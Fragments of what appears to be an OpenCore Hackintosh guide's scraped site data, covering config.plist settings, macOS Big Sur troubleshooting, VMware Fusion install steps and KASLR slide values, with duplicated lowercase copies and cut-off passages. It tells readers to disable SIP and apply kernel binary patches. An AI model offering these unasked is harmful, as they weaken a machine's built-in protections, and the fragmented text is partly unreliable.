AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot-arg alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present.

By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic.

tasks\n                      and doesn't drive a display\n\nnote: if booting macos ventura, you need to spoof your igpu as the closest kaby lake model.\n\nwe also add 3 more properties, framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem. the first enables patching via whatevergreen.kext, the second sets the min stolen memory to 19mb and third sets the framebuffer memory to 9mb. this is usually unnecessary, as this can be configured in bios(64mb recommended) but required when not available.\n\n * note: headless framebuffers(where the dgpu is the display out) do not need framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem\n\nand extra note for p530 users, your igpu is not natively supported so you will need to add the following property:\n\nkey         type   value\ndevice-id   data   1b190000\n\nonce you're done, you should have something similar:\n\nkey                        type   value\naapl,ig-platform-id        data   00001219\nframebuffer-patch-enable   data   01000000\nframebuffer-stolenmem      data   00003001\nframebuffer-fbmem          data   00009000\ndevice-id                  data   1b190000\n\n(this is an example for a desktop hd p530 without a dgpu and no bios options for igpu memory)\n\npciroot(0x0)/pci(0x1b,0x0)\n\nlayout-id\n\n * applies applealc audio injection, you'll need to do your own research

a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

Due to the outright removal of the class, trying to spoof to another ID (generally done by SATA-unsupported.kext) can fail for many and create instability for others.\n   * A partial fix is to inject Catalina's version with any conflicting symbols being patched. You can find a sample kext here: Catalina's patched AppleAHCIPort.kext\n   * We recommend setting the MinKernel value to 20.0.0 for the kext CtlnaAHCIPort.kext to avoid any potential conflicts. This way, it will work in both Catalina and Big Sur so you can remove SATA-unsupported if you want.\n\nOther notable changes:\n\n * MSI Navi users no longer require the ATY,rom/-wegnoegpu patch to boot the installer\n * Stage 2 installation requiring working NVRAM\n   * Asus 9 series: For more info, see here: Haswell ASUS Z97 Big Sur Update Thread\n   * X99 and X299 users with broken NVRAM will need to install on another machine and move the SSD when done\n\n\n# Up-to-date kexts, bootloader and config.plist\n\nEnsure that you have the latest version of OpenCore, kexts and config.plist so it won't have any odd compatibility issues. You can simply download and update OpenCore and kexts as mentioned here:\n\n * Updating OpenCore and macOS\n\nIf you're unsure what version of OpenCore you're using, you can run the following in terminal:\n\nnvram 4D1FDA02-38C7-4A6A-9CC6-4BCCA8B30102:opencore-version\n\n\n * Note: The about command will require you to include bit 0x2 in Misc -> Security -> ExposeSensitiveData, recommended values for ExposeSensitiveData is 0x6 which includes bits 0x2 and 0x4.\n\n# AMD Note\n\nReminder for AMD Users: Don't forget to update your kernel patches with those provided by AMD OS X, otherwise you'll be unable to boot Big Sur:\n\n * AMD OSX Patches\n\n# Intel HEDT Note\n\nFor X79, X99 and X299 users, pay close attention to the below. Big Sur has added new requirements for ACPI, so you'll need to grab some new SSDTs:\n\n * X79\n   * SSDT-UNC\n * X99\n   * SSDT-UNC\n   * SSDT-RTC0-RANGE\n * X299\n   * SSDT-RTC0-RANGE\n\nFor those who'd like precompiled files, see here:\n\n * Getting started with ACPI: Prebuilt SSDTs\n\n\n# Known issues\n\nWith Big Sur, quite a bit broke. Mainly the following:\n\n * Lilu\n   * Mainly user-space patching has severely broke, meaning certain functionality may have broken\n   * These include:\n     * DiskArbitrationFixup\n     * MacProMemoryNotificationDisabler\n     * SidecarEnabler\n     * SystemProfilerMemoryFixup\n     * NoTouchID\n     * WhateverGreen's DRM and -cdfon patches\n * AirportBrcmFixup\n   * Forcing a specific driver to load with brcmfx-driver= may help\n     * BCM94352Z users for example may need brcmfx-driver=2 in boot-args to resolve this, other chipsets will need other variables.\n   * Setting MaxKernel to 19.9.9 for AirPortBrcm4360_Injector.kext may help. More information from the repo\n * SATA Support broken\n   * Due to Apple dropping the AppleIntelPchSeriesAHCI class in AppleAHCIPort.kext\n   * To resolve, add Catalina's patched AppleAHCIPort.kext with the MinKernel set to 20.0.0\n * XhciPortLimit broken in macOS 11.3 Beta 2 and newer\n   * With macOS 11.3 and newer, XhciPortLimit is broken resulting in boot loops. We advise users either install an older OS(ie. macOS 10.15, Catalina) or find a 11.2.3 or older Big Sur installer\n     * For education purposes, we have a copy provided here: macOS 11.2.3 InstallAssistant(macOS)\n     * If you've already mapped your USB ports and disabled XhciPortLimit, you can boot macOS 11.3+ without issue\n\nAnd while not an issue, SIP has now gained a new bit so to properly disable SIP you need to set csr-active-config to FF0F0000. See here for more info: Disabling SIP\n\n\n# Installation\n\nGuides have been updated to accommodate Big Sur, see the applicable OS environment for you:\n\n * macOS users\n * Windows users\n * Linux users\n\n\n# Troubleshooting\n\n\n# Stuck at Forcing CS_RUNTIME for entitlement\n\n\n\nThis is actually the part at where macOS will seal the system volume, and where it may seem that macOS has gotten stuck. DO NOT RESTART thinking you're stuck, this will take quite some time to complete, otherwise you'll break your installation.\n\n\n# Stuck at PCI Configuration Begins for Intel's X99 and X299 boards\n\n\n\nAs previously mentioned, Intel HEDT motherboards may have some issues revolving around their RTC device in ACPI. To resolve, you'll need to look at your RTC device and see which regions are missing. For more information, see here: SSDT-RTC0-RANGE.dsl\n\n\n# Stuck on ramrod(^^^^^^^^^^^^^)\n\n\n\nIf you get stuck around the ramrod section (specifically, it boots, hits this error, and reboots again back into this, causing a loop), this hints that your SMC emulator is broken. To fix this, you have 2 options:\n\n * Ensure you're using the latest builds of VirtualSMC and Lilu, with the vsmcgen=1 boot-arg\n * Switch over to Rehabman's FakeSMC (you can use the MinKernel/MaxKernel trick mentioned above to restrict FakeSMC to Big Sur and up)\n\nAnd when switching kexts, ensure you don't have both FakeSMC and VirtualSMC enabled in your config.plist, as this will cause a conflict.\n\n\n# X79 and X99 Kernel Panic on IOPCIFamily\n\nThis is due to an unused uncore PCI Bridges being enabled in ACPI, and so IOPCIFamily will kernel panic when probing unknown devices. To resolve, you'll need to add SSDT-UNC to your system\n\n\n# DeviceProperties injection failing\n\nWith Big Sur, macOS has become much pickier with devices being present in ACPI. Especially if you're injecting important properties for WhateverGreen or AppleALC, you may find they're no longer applying. To verify whether your ACPI defines your hardware, check for the acpi-path property in IORegistryExplorer:\n\n\n\nIf no property is found, you'll need to create an SSDT that provides the full pathing as you likely have a PCI Bridge that is not documented in your ACPI tables. An example of this can be found here: SSDT-BRG0\n\n * Note: This issue may also pop up in older versions of macOS, however Big Sur is most likely to have issues.\n\n\n# Keyboard and Mouse broken\n\nFor certain legacy systems, you may notice that while the USB ports work your HID-based devices such as the keyboard and mouse may be broken. To resolve this, add the following patch:\n\nIOHIDFamily Patch\n\nconfig.plist -> Kernel -> Patch:\n\nKEY           TYPE      VALUE\nBase          String    _isSingleUser\nCount         Integer   1\nEnabled       Boolean   True\nFind          Data      \nIdentifier    String    com.apple.iokit.IOHIDFamily\nLimit         Integer   0\nMask          Data      \nMaxKernel     String    \nMinKernel     String    20.0.0\nReplace       Data      B801000000C3\nReplaceMask   Data      \nSkip          Integer   0\n\nSource\n\n\n# Early Kernel Panic on max_cpus_from_firmware not yet initialized\n\nIf you receive an early kernel panic on max_cpus_from_firmware not yet initialized, this is due to the new acpi_count_enabled_logical_processors method added in macOS Big Sur's kernel. To resolve, please ensure you're on OpenCore 0.6.0 or newer with the AvoidRuntimeDefrag Quirk enabled.\n\n * Note: Due to how early this kernel panic happens, you may only be able to log it either via serial or rebooting in a known working install of macOS and checking your panic logged in NVRAM.\n   * Most users will see this panic simply as [EB|#LOG:EXITBS:START]\n\nExample Kernel Panic\n\nOn-screen:\n\n\n\nVia serial logging or NVRAM:\n\n\n\nLegacy Edge Case\n\nOn certain hardware, mainly the HP DC7900, the kernel still can't determine exactly how many threads your hardware supports. This will result in the aforementioned kernel panic and so we need to hard code the CPU core's value.\n\nTo do this, Add the following patch(replacing the 04 from B8 04 00 00 00 C3 with the amount of CPU threads your hardware supports):\n\nKEY           TYPE      VALUE\nBase          String    _acpi_count_enabled_logical_processors\nCount         Integer   1\nEnabled       Boolean   True\nFind          Data      \nIdentifier    String    Kernel\nLimit         Integer   0\nMask          Data      \nMaxKernel     String    \nMinKernel     String    20.0.0\nReplace       Data      B804000000C3\nReplaceMask   Data      \nSkip          Integer   0\n\n\n# Cannot update to newer versions of Big Sur\n\nGenerally there's 2 main culprits:\n\n * Broken Update Utility\n   * Most common error if running a beta, try this first\n * Broken Seal\n\n# Broken Update Utility\n\nGenerally seen with every beta cycle, simply unenroll and enroll again:\n\n# Unenroll from beta catalog\nsudo /System/Library/PrivateFrameworks/Seeding.framework/Resources/seedutil unenroll\n# Enroll back in\nsudo /System/Library/PrivateFrameworks/Seeding.framework/Resources/seedutil enroll DeveloperSeed\n\n\nThen check back with settings, and it should pop up. If not, run the following:\n\n# List software updates via terminal\nsoftwareupdate -l\n\n\nThis should help kick the update utility back into gear. If you still have issues, check the Broken Seal section.\n\n# Broken Seal\n\nWith Apple's new snapshotting for the system drive, they now depend heavily on this for OS updates to apply correctly. So when a drove's seal is broken, macOS will refuse to update the drive.\n\nTo verify yourself, check that Snapshot Sealed returns as YES:\n\n# List all APFS volumes\ndiskutil apfs list\n\n# Look for your system volume\nVolume disk1s8 A604D636-3C54-4CAA-9A31-5E1A460DC5C0\n        ---------------------------------------------------\n        APFS Volume Disk (Role):   disk1s8 (System)\n        Name:                      Big Sur HD (Case-insensitive)\n        Mount Point:               Not Mounted\n        Capacity Consumed:         15113809920 B (15.1 GB)\n        Sealed:                    Broken\n        FileVault:                 No\n        |\n        Snapshot:                  4202EBE5-288B-4701-BA1E-B6EC8AD6397D\n        Snapshot Disk:             disk1s8s1\n        Snapshot Mount Point:      /\n        Snapshot Sealed:           Yes\n\n\nIf it returns Snapshot Sealed: Broken, then you'll want to go through the following:\n\n * Update to OpenCore 0.6.4 or newer\n   * Specifically commit ba10b5d or newer is required\n * Revert to older snapshots\n   * Mainly for those who have tampered with the system volume\n   * See here how to revert: Rolling back APFS Snapshots\n\n\n# Kernel Panic on Rooting from the live fs\n\nFull error:\n\nRooting from the live fs of a sealed volume is not allowed on a RELEASE build\n\n\nThis is due to issues around Secure Boot boot being enabled in Beta 10 with older versions of OpenCore. Simply update to 0.6.4 to resolve\n\n * Specifically commit ba10b5d or newer is required\n\n\n# Asus Z97 and HEDT(ie. X99 and X299) failing Stage 2 Installation\n\nWith Big Sur, there's a higher reliance on native NVRAM for installation otherwise the installer will get stuck in a reboot loop. To resolve this you'll need to either:\n\n * Install Big Sur on another machine, then transfer the drive\n * Fix the motherboard's NVRAM\n   * mainly applicable with Asus's Z97 series\n\nFor the latter, see here: Haswell ASUS Z97 Big Sur Update Thread\n\n\n# Laptops kernel panicking on cannot perform kext scan\n\nThis is due to multiple copies of the same kext being in your kernel cache, and to be more specific having multiple copies of VoodooInput. Look over your Kernel -> Add and verify you only have 1 copy of VoodooInput enabled.\n\n * Note: Both VoodooI2C and VoodooPS2 have a bundled copy of VoodooInput, which you disable is up to personal preference\n\n\n# Reboot on \"AppleUSBHostPort::createDevice: failed to create device\" on macOS 11.3+\n\nThis is due to XhciPortLimit breaking with macOS 11.3 and newer, to resolve you must disable XhciPortLimit under Kernel -> Quirks. Please ensure you've mapped your USB ports correctly before doing so.",normalizedContent:"# opencore and macos 11: big sur\n\nit's that time of year again and with it, and a new macos beta has been

macos, so see below that yours wasn't dropped:\n\n * imac14,3 and older\n   * note imac14,4 is still supported\n * macpro5,1 and older\n * macmini6,x and older\n * macbook7,1 and older\n * macbookair5,x and older\n * macbookpro10,x and older\n\nif your smbios was supported in catalina and isn't included above, you're good to go!\n\nsupported smbios\n\nsmbios still supported in macos big sur:\n\n * imac14,4 and newer\n * macpro6,1 and newer\n * imacpro1,1 and newer\n * macmini7,1 and newer\n * macbook8,1 and newer\n * macbookair6,x and newer\n * macbookpro11,x and newer\n\nfor full list of supported smbios including os support, see here: choosing the right smbios\n\nfor those wanting a simple translation for their machines:\n\n * imac13,1 should transition over to using imac14,4\n * imac13,2 should transition over to using imac15,1\n * imac14,2 and imac14,3 should transition over to using imac15,1\n   * note: amd cpu users with nvidia gpus may find macpro7,1 more suitable\n * imac14,1 should transition over to imac14,4\n\n\n# supported hardware\n\nnot much hardware has been dropped, though the few that have:\n\n * official ivy bridge u, h and s cpus.\n   * these cpus will still boot without much issue, but note that no macs are supported with consumer ivy bridge in big sur.\n   * ivy bridge-e cpus are still supported thanks to being in macpro6,1\n * ivy bridge igpus slated for removal\n   * hd 4000 and hd 2500, however currently these drivers are still present in 11.0.1\n * bcm4331 and bcm43224 based wifi cards.\n   * see wireless buyers guide for potential cards to upgrade to.\n   * potential work-around is to inject a patched io80211family, see here for more details: io80211 patches\n * certain sata controllers dropped\n   * for some reason, apple removed the appleintelpchseriesahci class from appleahciport.kext. due to the outright removal of the class, trying to spoof to another id (generally done by sata-unsupported.kext) can fail for many and create instability for others.\n   * a partial fix is to inject catalina's version with any conflicting symbols being patched. you can find a sample kext here: catalina's patched appleahciport.kext\n   * we recommend setting the minkernel value to 20.0.0 for the kext ctlnaahciport.kext to avoid any potential conflicts. this way, it will work in both catalina and big sur so you can remove sata-unsupported if you want.\n\nother notable changes:\n\n * msi navi users no longer require the aty,rom/-wegnoegpu patch to boot the installer\n * stage 2 installation requiring working nvram\n   * asus 9 series: for more info, see here: haswell asus z97 big sur update thread\n   * x99 and x299 users with broken nvram will need to install on another machine and move the ssd when done\n\n\n# up-to-date kexts, bootloader and config.plist\n\nensure that you have the latest version of opencore, kexts and config.plist so it won't have any odd compatibility issues. you can simply download and update opencore and kexts as mentioned here:\n\n * updating opencore and macos\n\nif you're unsure what version of opencore you're using, you can run the following in terminal:\n\nnvram 4d1fda02-38c7-4a6a-9cc6-4bcca8b30102:opencore-version\n\n\n * note: the about command will require you to include bit 0x2 in misc -> security -> exposesensitivedata, recommended values for exposesensitivedata is 0x6 which includes bits 0x2 and 0x4.\n\n# amd note\n\nreminder for amd users: don't forget to update your kernel patches with those provided by amd os x, otherwise you'll be unable to boot big sur:\n\n * amd osx patches\n\n# intel hedt note\n\nfor x79, x99 and x299 users, pay close attention to the below. big sur has added new requirements for acpi, so you'll need to grab some new ssdts:\n\n * x79\n   * ssdt-unc\n * x99\n   * ssdt-unc\n   * ssdt-rtc0-range\n * x299\n   * ssdt-rtc0-range\n\nfor those who'd like precompiled files, see here:\n\n * getting started with acpi: prebuilt ssdts\n\n\n# known issues\n\nwith big sur, quite a bit broke. mainly the following:\n\n * lilu\n   * mainly user-space patching has severely broke, meaning certain functionality may have broken\n   * these include:\n     * diskarbitrationfixup\n     * macpromemorynotificationdisabler\n     * sidecarenabler\n     * systemprofilermemoryfixup\n     * notouchid\n     * whatevergreen's drm and -cdfon patches\n * airportbrcmfixup\n   * forcing a specific driver to load with brcmfx-driver= may help\n     * bcm94352z users for example may need brcmfx-driver=2 in boot-args to resolve this, other chipsets will need other variables.\n   * setting maxkernel to 19.9.9 for airportbrcm4360_injector.kext may help. more information from the repo\n * sata support broken\n   * due to apple dropping the appleintelpchseriesahci class in appleahciport.kext\n   * to resolve, add catalina's patched appleahciport.kext with the minkernel set to 20.0.0\n * xhciportlimit broken in macos 11.3 beta 2 and newer\n   * with macos 11.3 and newer, xhciportlimit is broken resulting in boot loops. we advise users either install an older os(ie. macos 10.15, catalina) or find a 11.2.3 or older big sur installer\n     * for education purposes, we have a copy provided here: macos 11.2.3 installassistant(macos)\n     * if you've already mapped your usb ports and disabled xhciportlimit, you can boot macos 11.3+ without issue\n\nand while not an issue, sip has now gained a new bit so to properly disable sip you need to set csr-active-config to ff0f0000. see here for more info: disabling sip\n\n\n# installation\n\nguides have been updated to accommodate big sur, see the applicable os environment for you:\n\n * macos users\n * windows users\n * linux users\n\n\n# troubleshooting\n\n\n# stuck at forcing cs_runtime for entitlement\n\n\n\nthis is actually the part at where macos will seal the system volume, and where it may seem that macos has gotten stuck. do not restart thinking you're stuck, this will take quite some time to complete, otherwise you'll break your installation.\n\n\n# stuck at pci configuration begins for intel's x99 and x299 boards\n\n\n\nas previously mentioned, intel hedt motherboards may have some issues revolving around their rtc device in acpi. to resolve, you'll need to look at your rtc device and see which regions are missing. for more information, see here: ssdt-rtc0-range.dsl\n\n\n# stuck on ramrod(^^^^^^^^^^^^^)\n\n\n\nif you get stuck around the ramrod section (specifically, it boots, hits this error, and reboots again back into this, causing a loop), this hints that your smc emulator is broken. to fix this, you have 2 options:\n\n * ensure you're using the latest builds of virtualsmc and lilu, with the vsmcgen=1 boot-arg\n * switch over to rehabman's fakesmc (you can use the minkernel/maxkernel trick mentioned above to restrict fakesmc to big sur and up)\n\nand when switching kexts, ensure you don't have both fakesmc and virtualsmc enabled in your config.plist, as this will cause a conflict.\n\n\n# x79 and x99 kernel panic on iopcifamily\n\nthis is due to an unused uncore pci bridges being enabled in acpi, and so iopcifamily will kernel panic when probing unknown devices. to resolve, you'll need to add ssdt-unc to your system\n\n\n# deviceproperties injection failing\n\nwith big sur, macos has become much pickier with devices being present in acpi. especially if you're injecting important properties for whatevergreen or applealc, you may find they're no longer applying. to verify whether your acpi defines your hardware, check for the acpi-path property in ioregistryexplorer:\n\n\n\nif no property is found, you'll need to create an ssdt that provides the full pathing as you likely have a pci bridge that is not documented in your acpi tables. an example of this can be found here: ssdt-brg0\n\n * note: this issue may also pop up in older versions of macos, however big sur is most likely to have issues.\n\n\n# keyboard and mouse broken\n\nfor certain legacy systems, you may notice that while the usb ports work your hid-based devices such as the keyboard and mouse may be broken. to resolve this, add the following patch:\n\niohidfamily patch\n\nconfig.plist -> kernel -> patch:\n\nkey           type      value\nbase          string    _issingleuser\ncount         integer   1\nenabled       boolean   true\nfind          data      \nidentifier    string    com.apple.iokit.iohidfamily\nlimit         integer   0\nmask          data      \nmaxkernel     string    \nminkernel     string    20.0.0\nreplace       data      b801000000c3\nreplacemask   data      \nskip          integer   0\n\nsource\n\n\n# early kernel panic on max_cpus_from_firmware not yet initialized\n\nif you receive an early kernel panic on max_cpus_from_firmware not yet initialized, this is due to the new acpi_count_enabled_logical_processors method added in macos big sur's kernel. to resolve, please ensure you're on opencore 0.6.0 or newer with the avoidruntimedefrag quirk enabled.\n\n * note: due to how early this kernel panic happens, you may only be able to log it either via serial or rebooting in a known working install of macos and checking your panic logged in nvram.\n   * most users will see this panic simply as [eb|#log:exitbs:start]\n\nexample kernel panic\n\non-screen:\n\n\n\nvia serial logging or nvram:\n\n\n\nlegacy edge case\n\non certain hardware, mainly the hp dc7900, the kernel still can't determine exactly how many threads your hardware supports. this will result in the aforementioned kernel panic and so we need to hard code the cpu core's value.\n\nto do this, add the following patch(replacing the 04 from b8 04 00 00 00 c3 with the amount of cpu threads your hardware supports):\n\nkey           type      value\nbase          string    _acpi_count_enabled_logical_processors\ncount         integer   1\nenabled       boolean   true\nfind          data      \nidentifier    string    kernel\nlimit         integer   0\nmask          data      \nmaxkernel     string    \nminkernel     string    20.0.0\nreplace       data      b804000000c3\nreplacemask   data      \nskip          integer   0\n\n\n# cannot update to newer versions of big sur\n\ngenerally there's 2 main culprits:\n\n * broken update utility\n   * most common error if running a beta, try this first\n * broken seal\n\n# broken update utility\n\ngenerally seen with every beta cycle, simply unenroll and enroll again:\n\n# unenroll from beta catalog\nsudo /system/library/privateframeworks/seeding.framework/resources/seedutil unenroll\n# enroll back in\nsudo /system/library/privateframeworks/seeding.framework/resources/seedutil enroll developerseed\n\n\nthen check back with settings, and it should pop up. if not, run the following:\n\n# list software updates via terminal\nsoftwareupdate -l\n\n\nthis should help kick the update utility back into gear. if you still have issues, check the broken seal section.\n\n# broken seal\n\nwith apple's new snapshotting for the system drive, they now depend heavily on this for os updates to apply correctly. so when a drove's seal is broken, macos will refuse to update the drive.\n\nto verify yourself, check that snapshot sealed returns as yes:\n\n# list all apfs volumes\ndiskutil apfs list\n\n# look for your system volume\nvolume disk1s8 a604d636-3c54-4caa-9a31-5e1a460dc5c0\n        ---------------------------------------------------\n        apfs volume disk (role):   disk1s8

  snapshot mount point:      /\n        snapshot sealed:           yes\n\n\nif it returns snapshot sealed: broken, then you'll want to go through the following:\n\n * update to opencore 0.6.4 or newer\n   * specifically commit ba10b5d or newer is required\n * revert to older snapshots\n   * mainly for those who have tampered with the system volume\n   * see here how to revert: rolling back apfs snapshots\n\n\n# kernel panic on rooting from the live fs\n\nfull error:\n\nrooting from the live fs of a sealed volume is not allowed on a release build\n\n\nthis is due to issues around secure boot boot being enabled in beta 10 with older versions of opencore. simply update to 0.6.4 to resolve\n\n * specifically commit ba10b5d or newer is required\n\n\n# asus z97 and hedt(ie. x99 and x299) failing stage 2 installation\n\nwith big sur, there's a higher reliance on native nvram for installation otherwise the installer will get stuck in a reboot loop. to resolve this you'll need to either:\n\n * install big sur on another machine, then transfer the drive\n * fix the motherboard's nvram\n   * mainly applicable with asus's z97 series\n\nfor the latter, see here: haswell asus z97 big sur update thread\n\n\n# laptops kernel panicking on cannot perform kext scan\n\nthis is due to multiple copies of the same kext being in your kernel cache, and to be more specific having multiple copies of voodooinput. look over your kernel -> add and verify you only have 1 copy of voodooinput enabled.\n\n * note: both voodooi2c and voodoops2 have a bundled copy of voodooinput, which you disable is up to personal preference\n\n\n# reboot on \"appleusbhostport::createdevice: failed to create device\" on macos 11.3+\n\nthis is due to xhciportlimit breaking with macos 11.3 and newer, to resolve you must disable xhciportlimit under kernel -> quirks. please ensure you've mapped your usb ports correctly before doing so.",charsets:{cjk:!0}},{title:"VMware

Fusion\n * Java (both the JRE and JDK work)\n * A computer running macOS\n * The desired macOS installation software installed to /Applications\n * A USB attached hard disk or SSD, or an internal disk that can be passed through entirely\n\n\n# Converting Installation Media\n\nVMware cannot directly use a raw disk image, so we\'ll create a linked VMDK, which will allow you to use it as a virtual hard drive in VMware Fusion.\n\nDownload raw2vmdk from here, and put it in the same directory as the .img file. Then, run the following command:\n\n### Change "Install macOS Big Sur Beta" if the name of the .img file differs\njava -jar raw2vmdk.jar "Install macOS Big Sur Beta.img" "Install macOS Big Sur Beta.vmdk"\n\n\nThis will create a VMDK that references the .img file (the raw disk image) for VMware to use. If you\'re going to move this vmdk or transfer it to another computer, you must move the img file along with it.\n\n\n# Installing macOS Big Sur in VMware Fusion\n\nYou have two options here: pass through a raw disk, or pass through an entire USB device. The steps are not that different for both, so they\'ll be combined here.\n\n 1.  (Skip this if you are doing USB passthrough) For raw disk passthrough, attach the disk that is your target for macOS installation, and create a virtual hard disk that references it to use with Fusion.\n     \n     Note: You may need to remove the partitions of the disk before using it.\n     \n     diskutil list\n     # locate the external disk that matches, and replace /dev/disk3 below with the device path.\n     sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmware-rawdiskCreator create /dev/disk3 fullDevice RawHDD ide\n     \n\n 2.  Next, start VMware Fusion. You should see the homepage. If not, close any window that opened and select File > New from the menu bar.\n\n 3.  Select the "Create a custom virtual machine" option, and select macOS 10.15 (as 10.16/11 isn\'t available).\n\n 4.  Select "Use an existing virtual disk" at the screen below.\n\n 5.  Then, click "Choose virtual disk" and select the Install macOS Beta.vmdk vmdk we made earlier. If you want to make sure VMware does not copy the disk to where you will be storing the VM (for example, if you are low on space), select "Share this virtual disk with the virtual machine that created it". Once done, it should look like this.\n\n 6.  Hit Continue, then click "Customize Settings". Make sure to save the VM to somewhere that\'s not the disk you are passing through.\n     \n     Once done, you should arrive at a screen that looks like this.\n\n 7.  First, select "Processors & Memory", and set the memory to at least 4096 MB.\n\n 8.  (If you are doing raw disk passthrough, skip this step) Select "Show All" and click "USB & Bluetooth". Plug in your USB device and under "Plug In Action", change it from "Ask what to do" to "Connect to the VM". It should look similar to this when done. (In this case, "VIA AmazonBasics Hard Drive Enclos" is my device.) Then, close the window.\n\n 9.  (If you are doing USB passthrough, skip steps 9 through 13) Close the window and close VMware Fusion. Locate the "macOS 10.15.vmwarevm" (or whatever you named it when saving) folder in Finder, and right click > "Show Package Contents".\n     \n     The result should look like the image below.\n\n 10. Open the vmx (not vmxf or vmx.lck folder) file in TextEdit. It should look something like this:\n\n 11. Find the lines starting with sata0:1:\n\n 12. Replace all the lines starting with sata0:1 with the following. Replace <path/to/vmdk> with the full path to RawHDD.vmdk, created earlier above.\n     \n     Tip: Find it in Finder, then right click, hold down option, and select \'Copy "RawHDD.vmdk" as Pathname\' to get the full path easily.\n     \n     sata0:1.fileName = "<path/to/vmdk>"\n     sata0:1.present = "TRUE"\n     sata0:1.deviceType = "rawDisk"\n     \n     \n     It should look something like the below when done.\n\n 13. Save and quit TextEdit, and reopen VMware Fusion. Your VM should automatically open, but if not, open it from the Virtual Machine Library.\n\n 14. Select "Virtual Machine" > "Power On To Firmware" from the menu bar, so that we can boot to the VM BIOS.\n     \n     * (For raw disk passthrough) If you get prompted for your password when you do this, enter it. Even though the prompt mentions Boot Camp disks, it is still working normally.\n     \n     * If you get an error that the resource is busy like below, run the following in Terminal and try again:\n     \n     diskutil list\n     # replace /dev/disk3 below with the proper device path. for raw disk passthrough, it was found before\n     sudo diskutil unmountDisk /dev/disk3\n     \n     \n     \n\n 15. You should get to the VM Boot Manager, as shown below. Select the first hard drive ("EFI VMware Virtual SATA Hard Drive (0.0)). The VM should start booting the Big Sur installer.\n\n 16. Complete the installation as you would on any other device. the installation is complete, and you are at the Welcome screen, select "Virtual Machine" > "Shut Down" from the menu bar.\n     \n     If needed, add your prepared EFI to the EFI partition on the device, then eject it.\n     \n     Place the drive back in your hack and boot normally. You now have Big Sur!',normalizedContent:'# vmware fusion\n\n\n# requirements\n\n * vmware fusion\n * java (both the jre and jdk work)\n * a computer running macos\n * the desired macos installation software installed to /applications\n * a usb attached hard disk or ssd, or an internal disk that can be passed through entirely\n\n\n# converting installation media\n\nvmware cannot directly use a raw disk image, so we\'ll create a linked vmdk, which will allow you to use it as a virtual hard drive in vmware fusion.\n\ndownload raw2vmdk from here, and put it in the same directory as the .img file. then, run the following command:\n\n### change "install macos big sur beta" if the name of the .img file differs\njava -jar raw2vmdk.jar "install macos big sur beta.img" "install macos big sur beta.vmdk"\n\n\nthis will create a vmdk that references the .img file (the raw disk image) for vmware to use. if you\'re going to move this vmdk or transfer it to another computer, you must move the img file along with it.\n\n\n# installing macos big sur in vmware fusion\n\nyou have two options here: pass through a raw disk, or pass through an entire usb device. the steps are not that different for both, so they\'ll be combined here.\n\n 1.

This is most common with either Z390, X99 and X299.\n\n * Note: OpenCore is required, Clover is no longer supported in this guide\n\n\n# So what is KASLR\n\nWell KASLR stands for Kernel address space layout randomization, what it's used for is security purposes. Specifically, this makes it much harder for attackers to figure out where the important objects are in memory as it's always random both between machines and between boots. More in-depth explainer on KASLR\n\nWhere this becomes an issue is when you introduce devices with either small memory maps or just way too many devices present. There likely is space for the kernel to operate but there's also free space where the kernel won't fit entirely. This is where slide=xxx fits in. Instead of letting macOS choose a random area to operate in each boot, we'll constrain it to somewhere that we know will work.\n\n\n# And who is this info for\n\nWell as I mentioned earlier, this is for users who don't have enough space for the kernel or moves to a place that is too small. You'll generally experience an error similar to this when booting:\n\nError allocating 0x1197b pages at 0x0000000017a80000 alloc type 2\nCouldn't allocate runtime area\n\n\nWith some variation:\n\nOnly 244/256 slide values are usable!\n\n\nOr even crashes while running macOS:\n\npanic(cpu 6 caller 0xffffff801fc057ba): a freed zone element has been modified in zone kalloc.4096: expected 0x3f00116dbe8a46f6 but found 0x3f00116d00000000\n\n\nThe best part about these errors is that they can be random, also the reason why power cycling your PC 20 times also can fix the issue but only temporarily.\n\nFun Fact: It takes around 31 ms to find an area to operate in, manually setting a slide value can on average can reduce boot times by 0.207%!!!\n\n\n# So how do I fix this\n\nThe real fix to this is quite simple actually. What you'll need:\n\n * OpenCore users:\n   * OpenRuntime\n   * OpenShell(Don't forget to enable this under Root -> Misc -> Tools)\n\nAnd we'll also need to configure our config.plist -> Booter:\n\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * DevirtualiseMmio: YES\n   * Reduces Stolen Memory Footprint, expands options for slide=N values and very helpful with fixing Memory Allocation issues on Z390.\n * EnableSafeModeSlide: YES\n   * Allows for slide values to be used in Safe mode\n * ProtectUefiServices: NO\n   * Protects UEFI services from being overridden by the firmware, mainly relevant for VMs, 300 series and 